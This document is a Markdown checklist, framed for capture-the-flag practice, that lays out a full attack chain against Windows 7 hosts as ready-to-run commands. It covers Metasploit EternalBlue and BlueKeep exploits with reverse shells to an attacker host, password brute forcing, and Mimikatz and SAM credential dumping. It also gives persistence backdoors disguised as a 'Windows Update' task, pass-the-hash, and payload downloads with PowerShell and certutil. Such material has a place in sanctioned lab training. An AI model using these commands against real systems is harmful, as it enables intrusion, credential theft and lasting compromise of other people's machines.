# CTF Penetration Testing Checklist - Windows 7

## Target: Windows 7 Machine

### Phase 1: Information Gathering & Reconnaissance

#### 1.1 Network Discovery
```bash
# Ping sweep
nmap -sn 192.168.1.0/24

# Host discovery
netdiscover -r 192.168.1.0/24
arp-scan -l
```

#### 1.2 Port Scanning
```bash
# Quick scan
nmap -sV -sC [target_ip]

# Full port scan
nmap -p- -T4 [target_ip]

# Aggressive scan
nmap -A -T4 [target_ip]

# Common Windows ports
nmap -p 21,22,23,25,53,80,110,135,139,143,443,445,1433,3306,3389,5985,8080 [target_ip]
```

#### 1.3 OS Detection
```bash
nmap -O [target_ip]
nmap --script smb-os-discovery [target_ip]
```

#### 1.4 Service Version Detection
```bash
nmap -sV --version-all [target_ip]
nmap -p 445 --script smb-protocols [target_ip]
```

---

### Phase 2: Enumeration & Vulnerability Scanning

#### 2.1 SMB Enumeration (Port 445, 139)
```bash
# List shares
smbclient -L //[target_ip] -N
smbmap -H [target_ip]
smbmap -H [target_ip] -u guest

# Connect to shares
smbclient //[target_ip]/C$ -U administrator
smbclient //[target_ip]/ADMIN$ -N

# Enum4linux
enum4linux -a [target_ip]
enum4linux -U [target_ip]  # Users
enum4linux -S [target_ip]  # Shares
enum4linux -G [target_ip]  # Groups

# CrackMapExec
crackmapexec smb [target_ip]
crackmapexec smb [target_ip] -u '' -p ''
crackmapexec smb [target_ip] -u 'guest' -p ''
```

#### 2.2 SMB Vulnerability Scanning
```bash
# MS17-010 (EternalBlue)
nmap --script smb-vuln-ms17-010 -p 445 [target_ip]

# MS08-067 (Conficker)
nmap --script smb-vuln-ms08-067 --script-args=unsafe=1 -p 445 [target_ip]

# All SMB vulnerabilities
nmap --script smb-vuln* -p 445 [target_ip]
```

#### 2.3 RDP Enumeration (Port 3389)
```bash
# Check RDP
nmap -p 3389 --script rdp-enum-encryption [target_ip]
nmap -p 3389 --script rdp-ntlm-info [target_ip]
```

#### 2.4 HTTP/HTTPS Enumeration (Port 80, 443, 8080)
```bash
# Web server detection
whatweb http://[target_ip]
nikto -h http://[target_ip]

# Directory enumeration
gobuster dir -u http://[target_ip] -w /usr/share/wordlists/dirb/common.txt
dirb http://[target_ip] /usr/share/wordlists/dirb/common.txt
feroxbuster -u http://[target_ip] -w /usr/share/wordlists/dirb/common.txt

# IIS specific
gobuster dir -u http://[target_ip] -w /usr/share/wordlists/dirb/common.txt -x asp,aspx,html,txt
```

#### 2.5 FTP Enumeration (Port 21)
```bash
# Anonymous FTP
ftp [target_ip]
# Try: anonymous / anonymous

# FTP brute force
hydra -l administrator -P /usr/share/wordlists/rockyou.txt ftp://[target_ip]
```

#### 2.6 SQL Server Enumeration (Port 1433)
```bash
# MSSQL enumeration
nmap -p 1433 --script ms-sql-info [target_ip]
nmap -p 1433 --script ms-sql-empty-password [target_ip]
nmap -p 1433 --script ms-sql-brute [target_ip]
```

#### 2.7 WinRM Enumeration (Port 5985, 5986)
```bash
# WinRM check
nmap -p 5985 --script http-methods [target_ip]
crackmapexec winrm [target_ip] -u administrator -p password
```

---

### Phase 3: Exploitation

#### 3.1 MS17-010 (EternalBlue) - CVE-2017-0144
```bash
# Metasploit
msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS [target_ip]
set payload windows/x64/meterpreter/reverse_tcp
set LHOST [attacker_ip]
set LPORT 4444
exploit

# Alternative payload
set payload windows/x64/shell/reverse_tcp
exploit
```

#### 3.2 MS08-067 (Conficker) - CVE-2008-4250
```bash
msfconsole
use exploit/windows/smb/ms08_067_netapi
set RHOSTS [target_ip]
set payload windows/shell_reverse_tcp
set LHOST [attacker_ip]
exploit
```

#### 3.3 MS09-050 (SMBv2 Negotiate Protocol)
```bash
msfconsole
use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
set RHOSTS [target_ip]
set payload windows/shell_reverse_tcp
set LHOST [attacker_ip]
exploit
```

#### 3.4 BlueKeep (RDP) - CVE-2019-0708
```bash
msfconsole
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS [target_ip]
set target 2  # Windows 7 SP1
set payload windows/x64/meterpreter/reverse_tcp
set LHOST [attacker_ip]
exploit
```

#### 3.5 SMB Relay Attack
```bash
# Responder
responder -I eth0 -wrf

# ntlmrelayx
ntlmrelayx.py -t [target_ip] -smb2support
```

#### 3.6 Password Attacks

**RDP Brute Force**
```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://[target_ip]
crowbar -b rdp -s [target_ip]/32 -u administrator -C /usr/share/wordlists/rockyou.txt
```

**SMB Brute Force**
```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://[target_ip]
crackmapexec smb [target_ip] -u administrator -p /usr/share/wordlists/rockyou.txt
```

**WinRM Brute Force**
```bash
crackmapexec winrm [target_ip] -u administrator -p /usr/share/wordlists/rockyou.txt
```

#### 3.7 Web Application Exploitation
```bash
# SQL Injection
sqlmap -u "http://[target_ip]/page.asp?id=1" --dbs
sqlmap -u "http://[target_ip]/page.asp?id=1" -D database --tables
sqlmap -u "http://[target_ip]/page.asp?id=1" --os-shell

# File upload vulnerability
# Upload aspx web shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[attacker_ip] LPORT=4444 -f aspx > shell.aspx
```

#### 3.8 Credential Harvesting
```bash
# Mimikatz via Metasploit
meterpreter> load kiwi
meterpreter> creds_all

# Extract SAM database
meterpreter> hashdump
```

---

### Phase 4: Post-Exploitation

#### 4.1 System Information
```cmd
# Basic information
systeminfo
hostname
whoami
whoami /priv
whoami /groups

# Network information
ipconfig /all
route print
arp -a
netstat -ano

# User information
net user
net user administrator
net localgroup
net localgroup administrators
```

#### 4.2 Privilege Escalation

**Check Privileges**
```cmd
whoami /priv
whoami /all
```

**Find Unquoted Service Paths**
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

**Search for Vulnerable Services**
```cmd
# All services
sc query

# Service permissions
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula

# Weak service permissions
sc qc [service_name]
sc config [service_name] binpath= "C:\path\to\shell.exe"
sc start [service_name]
```

**Registry AutoRun Keys**
```cmd
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

**Scheduled Tasks**
```cmd
schtasks /query /fo LIST /v
```

**AlwaysInstallElevated**
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both are 1, exploit:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[attacker_ip] LPORT=4444 -f msi > shell.msi
msiexec /quiet /qn /i C:\path\to\shell.msi
```

**Token Impersonation**
```cmd
# Meterpreter
meterpreter> use incognito
meterpreter> list_tokens -u
meterpreter> impersonate_token "NT AUTHORITY\\SYSTEM"
```

**Kernel Exploits**
```bash
# Check Windows version
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# Search for exploits
searchsploit windows 7
msfconsole
search ms10-015  # Windows 7 Kernel
search ms15-051  # Windows 7 Kernel
search ms16-032  # Secondary Logon Service
```

#### 4.3 Persistence

**Create Admin User**
```cmd
net user hacker Password123! /add
net localgroup administrators hacker /add
```

**Registry Run Key**
```cmd
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\path\to\shell.exe" /f
```

**Scheduled Task**
```cmd
schtasks /create /tn "Windows Update" /tr C:\path\to\shell.exe /sc onlogon /ru System
```

**Service Creation**
```cmd
sc create backdoor binpath= "C:\path\to\shell.exe" start= auto
sc start backdoor
```

#### 4.4 Data Exfiltration

**Find Sensitive Files**
```cmd
# Search for files
dir /s *password*
dir /s *vnc.ini
dir /s *pass*
dir /s *.txt
dir /s *.xml
dir /s *.config

# Specific locations
type C:\Users\Administrator\Desktop\flag.txt
type C:\Users\Administrator\Desktop\root.txt
type C:\Users\[username]\Desktop\user.txt

# Browser credentials
dir /s "C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data"
```

**Extract SAM & SYSTEM**
```cmd
reg save HKLM\SAM C:\SAM
reg save HKLM\SYSTEM C:\SYSTEM

# Transfer to Kali
meterpreter> download C:\SAM
meterpreter> download C:\SYSTEM

# Crack on Kali
samdump2 SYSTEM SAM
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

**Password Files**
```cmd
type C:\Windows\repair\SAM
type C:\Windows\System32\config\RegBack\SAM
type C:\unattend.xml
type C:\Windows\Panther\Unattend.xml
```

#### 4.5 Lateral Movement
```bash
# Pass-the-Hash
crackmapexec smb [target_ip] -u administrator -H [NTLM_hash]
psexec.py administrator@[target_ip] -hashes [NTLM_hash]

# WMI Execution
wmiexec.py administrator:password@[target_ip]

# RDP
rdesktop [target_ip] -u administrator -p password
xfreerdp /u:administrator /p:password /v:[target_ip]
```

---

## Common Windows 7 Vulnerabilities

| CVE | Name | Exploit |
|-----|------|---------|
| CVE-2017-0144 | MS17-010 (EternalBlue) | `exploit/windows/smb/ms17_010_eternalblue` |
| CVE-2008-4250 | MS08-067 (Conficker) | `exploit/windows/smb/ms08_067_netapi` |
| CVE-2009-3103 | MS09-050 (SMBv2) | `exploit/windows/smb/ms09_050_smb2_negotiate_func_index` |
| CVE-2010-0232 | MS10-015 (Kernel) | `exploit/windows/local/ms10_015_kitrap0d` |
| CVE-2011-1249 | MS11-046 (AFD.sys) | `exploit/windows/local/ms11_046_afi` |
| CVE-2015-1701 | MS15-051 (Kernel) | `exploit/windows/local/ms15_051_client_copy_image` |
| CVE-2016-0099 | MS16-032 (Secondary Logon) | `exploit/windows/local/ms16_032_secondary_logon_handle_privesc` |
| CVE-2019-0708 | BlueKeep (RDP) | `exploit/windows/rdp/cve_2019_0708_bluekeep_rce` |

---

## Useful Tools

### Enumeration
- **nmap** - Network scanning
- **enum4linux** - SMB enumeration
- **smbmap** - SMB share enumeration
- **CrackMapExec** - Multi-protocol enumeration
- **Responder** - LLMNR/NBT-NS poisoning

### Exploitation
- **Metasploit** - Exploitation framework
- **Impacket** - Python SMB/NTLM tools
- **mimikatz** - Credential extraction
- **PowerSploit** - PowerShell exploitation

### Privilege Escalation
- **WinPEAS** - Windows privilege escalation checker
- **PowerUp** - PowerShell privilege escalation
- **windows-exploit-suggester** - Patch level analysis
- **Sherlock** - PowerShell vulnerability scanner

### Post-Exploitation
- **Empire** - Post-exploitation framework
- **Covenant** - .NET C2 framework
- **Cobalt Strike** - Advanced threat emulation

---

## Quick Reference Commands

### Reverse Shell Payloads
```bash
# MSFVenom Windows shells
msfvenom -p windows/shell_reverse_tcp LHOST=[ip] LPORT=4444 -f exe > shell.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ip] LPORT=4444 -f exe > meterpreter.exe
msfvenom -p windows/shell_reverse_tcp LHOST=[ip] LPORT=4444 -f aspx > shell.aspx
```

### Listener Setup
```bash
# Netcat
nc -lvnp 4444

# Metasploit
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST [attacker_ip]
set LPORT 4444
exploit
```

### File Transfer
```cmd
# PowerShell download
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://[attacker_ip]/file.exe','C:\temp\file.exe')"

# Certutil
certutil -urlcache -f http://[attacker_ip]/file.exe C:\temp\file.exe

# SMB transfer
copy \\[attacker_ip]\share\file.exe C:\temp\file.exe
```

---

## CTF Flag Locations (Windows 7)

```cmd
C:\Users\Administrator\Desktop\root.txt
C:\Users\Administrator\Desktop\flag.txt
C:\Users\[username]\Desktop\user.txt
C:\flag.txt
C:\Users\Public\Desktop\flag.txt
C:\Windows\System32\flag.txt
```

---

## Pro Tips

1. **Always start with nmap** - Full port scan reveals hidden services
2. **Check SMB first** - Windows 7 often has SMB vulnerabilities
3. **Try default credentials** - admin/admin, administrator/password
4. **MS17-010 is king** - EternalBlue works on unpatched Win7
5. **Use WinPEAS** - Automates privilege escalation checks
6. **Check unquoted service paths** - Easy privilege escalation
7. **AlwaysInstallElevated** - Quick system access if enabled
8. **Mimikatz is your friend** - Extract credentials from memory
9. **Document everything** - Keep track of credentials found
10. **Be patient** - Some exploits take time to work